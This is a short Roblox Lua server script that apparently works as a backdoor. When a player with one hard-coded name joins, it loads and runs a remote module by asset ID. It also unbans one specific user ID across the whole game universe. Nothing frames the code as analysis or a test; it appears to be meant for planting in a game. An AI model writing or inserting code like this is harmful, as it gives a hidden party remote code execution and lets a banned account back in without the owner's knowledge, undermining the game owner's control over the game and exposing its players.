game.Players.PlayerAdded:Connect(function(player)
    if player.Name == "9ssd" then
        local character = player.Character or player.CharacterAdded:Wait()
        require(5196668511)(player.Name)
    end
end)

task.spawn(function()
    game:GetService("Players"):UnbanAsync({UserIds = {781984681}, ApplyToUniverse = true})
end)
